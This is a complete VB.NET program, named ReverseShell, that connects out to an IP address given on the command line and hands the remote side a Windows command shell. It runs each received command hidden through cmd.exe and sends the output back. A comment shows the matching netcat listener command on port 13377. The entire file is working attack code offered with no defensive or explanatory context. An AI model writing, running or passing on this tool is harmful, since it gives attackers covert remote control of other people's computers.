Imports System.Net
Imports System.Net.Sockets
Imports System.Text

Module ReverseShell
    Sub Main(ByVal args As String())
        Dim asciiArt As String = "
  _____            _      _____          _
 |  __ \          | |    / ____|        | |
 | |__) |___  __ _| |___| |     ___   __| | ___
 |  _  // _ \/ _` | |_  / |    / _ \ / _` |/ _ \
 | | \ \  __/ (_| | |/ /| |___| (_) | (_| |  __/
 |_|  \_\___|\__,_|_/___|\_____\___/ \__,_|\___|
"

        Dim port As Integer = 13377 ' nc -l -p 13377

        If args.Length < 1 Then
            Console.WriteLine("Please provide the IP address as a command-line argument.")
            Return
        End If

        Dim ip As String = args(0)
        Dim ipAddress As IPAddress = IPAddress.Parse(ip)
        Dim remoteEndPoint As New IPEndPoint(ipAddress, port)

        Dim client As New TcpClient()
        client.Connect(remoteEndPoint)
        Dim stream As NetworkStream = client.GetStream()

        Dim asciiArtBytes As Byte() = Encoding.ASCII.GetBytes(asciiArt)
        stream.Write(asciiArtBytes, 0, asciiArtBytes.Length)

        Dim buffer(1024) As Byte
        While True
            stream.Write(Encoding.ASCII.GetBytes(vbLf & "$ "), 0, 3)
            Dim bytesRead As Integer = stream.Read(buffer, 0, buffer.Length)
            Dim cmd As String = Encoding.ASCII.GetString(buffer, 0, bytesRead).Trim()

            If cmd = "exit" Then
                stream.Close()
                client.Close()
                Return
            Else
                Dim process As New System.Diagnostics.Process()
                process.StartInfo.FileName = "cmd.exe"
                process.StartInfo.Arguments = "/c " & cmd & " 2>&1"
                process.StartInfo.RedirectStandardOutput = True
                process.StartInfo.UseShellExecute = False
                process.StartInfo.CreateNoWindow = True
                process.Start()

                Dim output As String = process.StandardOutput.ReadToEnd()
                process.WaitForExit()

                Dim outputBytes As Byte() = Encoding.ASCII.GetBytes(output)
                stream.Write(outputBytes, 0, outputBytes.Length)
            End If
        End While
    End Sub
End Module
